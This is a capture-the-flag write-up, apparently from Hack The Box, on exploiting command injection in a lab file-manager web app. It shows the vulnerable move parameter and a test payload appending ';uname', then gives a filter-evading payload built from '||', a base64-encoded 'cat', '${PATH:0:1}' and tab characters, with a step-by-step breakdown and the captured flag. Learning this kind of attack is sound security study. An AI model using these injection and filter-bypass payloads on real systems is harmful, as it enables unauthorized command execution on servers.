You are contracted to perform a penetration test for a company, and through your pentest, you stumble upon an interesting file manager web application. As file managers tend to execute system commands, you are interested in testing for command injection vulnerabilities.

Use the various techniques presented in this module to detect a command injection vulnerability and then exploit it, evading any filters in place.


![Pasted image 20250205145850.png](../../../IMAGES/Pasted%20image%2020250205145850.png)

## Reconnaissance
---

Once we've authenticated, we can see the following:

![Pasted image 20250205145916.png](../../../IMAGES/Pasted%20image%2020250205145916.png)

We got a lot of functions in this page, being:

```ad-summary
1. Direct Link
2. Preview
3. Copy to
4. Download
```

After checking each of them, I found the following in the `Copy to` function:

![Pasted image 20250205150700.png](../../../IMAGES/Pasted%20image%2020250205150700.png)

We have a `Copy` and `Move` function in this page, they go by the following parameters:

Copy:
```
/index.php?to=&from=51459716.txt&finish=1
```

Move:

```
/index.php?to=&from=51459716.txt&finish=1&move=1 
```

In the move URL, if we modify the to value to empty, we can see the following:

![Pasted image 20250205153325.png](../../../IMAGES/Pasted%20image%2020250205153325.png)

Which means, it could be vulnerable to command injection, let's try sending a simple payload like:

```
/index.php?to=&from=51459716.txt;uname&finish=1&move=1
```

We will see the following:

![Pasted image 20250205153433.png](../../../IMAGES/Pasted%20image%2020250205153433.png)

This is indeed vulnerable to command injection, let's craft our payload to read the flag.

## Exploitation
---

Commands like `cat`, `mv` and `ls` are blocked, we need to bypass them using what we've learned in this module, let's do the following payload:

```
%7C%7Cbash<<<$(base64%09-d<<<Y2F0ICR7UEFUSDowOjF9ZmxhZy50eHQK)
```

```ad-important
#### Breakdown
---
### **1. URL Decoding First**

- `%7C%7C`Â â†’Â `||`Â (double pipe operator in Linux).
    
- `%09`Â â†’ Tab character (used to replace spaces).
    

Decoded payload:


`||bash<<<$(base64 -d<<<Y2F0ICR7UEFUSDowOjF9ZmxhZy50eHQK)`


---

### **2. Command Structure**

- **`||`**: Execute the second commandÂ **regardless**Â of whether the first command (`mv`, in the original app) succeeds or fails.
    
- **`bash<<<`**: Pass the following string as input toÂ `bash`Â for execution.
    

---

### **3. Decoding the Base64 String**

The inner command is:

`$(base64 -d<<<Y2F0ICR7UEFUSDowOjF9ZmxhZy50eHQK)`

- **`base64 -d`**: Decodes a Base64-encoded string.
    
- **`<<<Y2F0ICR7UEFUSDowOjF9ZmxhZy50eHQK`**: Passes the Base64 string toÂ `base64 -d`.
    

**Decoding the Base64**:


`echo "Y2F0ICR7UEFUSDowOjF9ZmxhZy50eHQK" | base64 -d`

**Result**:

`cat ${PATH:0:1}flag.txt`

---

### **4. Breaking Down the Final Command**

The decoded command is:

`cat ${PATH:0:1}flag.txt`

- **`${PATH:0:1}`**: Extracts the first character of theÂ `PATH`Â environment variable (which isÂ `/`).
    
    - Example: IfÂ `PATH=/usr/local/bin:/usr/bin`,Â `${PATH:0:1}`Â â†’Â `/`.
        
- **Result**:Â `cat /flag.txt`.
    

---

### **5. Why Use These Techniques?**

- **`||`**: Bypasses command injection filters by executing regardless of the first command's success.
    
- **`base64`**: Obfuscates the command to bypass keyword filters (e.g.,Â `cat`,Â `/`).
    
- **`${PATH:0:1}`**: Avoids usingÂ `/`Â directly (common blacklisted character).
    
- **`%09`Â (tab)**: Replaces spaces to bypass space filters.
    

---

### **Full Payload Flow**

1. The app runsÂ `mv [file] [to]`.
    
2. The payload injectsÂ `||bash<<<$(base64 -d<<<...)`.
    
3. The Base64 string decodes toÂ `cat /flag.txt`.
    
4. `bash`Â executes the decoded command, printing the flag.
```

If we needed to look around for the flag, we'd need to use more payloads, since this is not needed, we can simply use this one.

So, let's send it like this:

```
http://94.237.54.42:31196/index.php?to=%7C%7Cbash<<<$(base64%09-d<<<Y2F0ICR7UEFUSDowOjF9ZmxhZy50eHQK)&from=51459716.txt&finish=1&move=1
```

We will see the following output:

![Pasted image 20250205153914.png](../../../IMAGES/Pasted%20image%2020250205153914.png)

Flag is `HTB{c0mm4nd3r_1nj3c70r}`

![Pasted image 20250205154011.png](../../../IMAGES/Pasted%20image%2020250205154011.png)

